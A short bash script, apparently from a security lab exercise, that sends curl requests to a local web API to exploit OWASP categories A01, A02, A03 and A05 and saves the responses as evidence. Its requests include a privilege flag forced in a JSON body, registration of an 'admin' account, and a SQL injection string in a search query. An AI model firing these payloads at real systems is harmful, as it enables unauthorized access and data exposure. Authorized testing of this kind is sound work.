#!/bin/bash
mkdir -p evidencias_fase1
echo "[*] Explotando A01..."
curl -s -X POST http://localhost:3000/api/content/exclusive -H "Content-Type: application/json" -d '{"is_vip": true}' > evidencias_fase1/evidencia_A01.txt
echo "[*] Explotando A02..."
curl -s -X POST http://localhost:3000/api/creators/register -H "Content-Type: application/json" -d '{"username": "admin", "password": "password123"}' > evidencias_fase1/evidencia_A02.txt
echo "[*] Explotando A03..."
curl -s -X GET "http://localhost:3000/api/podcasts/search?q=' OR 1=1 --" > evidencias_fase1/evidencia_A03.txt
echo "[*] Explotando A05..."
curl -s -X GET http://localhost:3000/api/system/status > evidencias_fase1/evidencia_A05.txt